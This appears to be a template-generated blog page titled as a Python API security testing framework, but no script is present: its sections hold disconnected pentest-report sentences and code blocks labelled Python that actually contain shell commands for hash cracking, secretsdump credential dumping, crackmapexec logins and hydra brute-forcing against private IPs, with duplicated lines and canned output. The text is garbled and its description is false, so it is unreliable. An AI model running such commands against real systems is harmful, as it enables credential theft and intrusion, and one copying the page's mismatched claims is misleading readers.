---
TitleSEO: "API Security Testing Framework in Python | ZureFX"
TitlePost: "API Security Testing Framework — Python"
Author: "ZureFX"
Description: "A Python script for api security testing framework. Built for security research and automation."
Keywords: "python, rust, automation, script"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-469.html"
URL_IMAGES: ""
Date: "2025-09-19"
Tags: "Python, Rust, Automation, Script"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-469"
Permalink: "/scripting/script-api-security-testing-framework-469.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `sharphound`
- `hashcat`
- `secretsdump`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p443,993,21 10.122.236.192 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.174.245
```

## Usage

### Basic Usage

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.56.79.170 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.153.165/FUZZ
crackmapexec smb 10.83.174.239 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.169.83 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.73.131.115 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 2 results
[+] Done in 3.89s
```
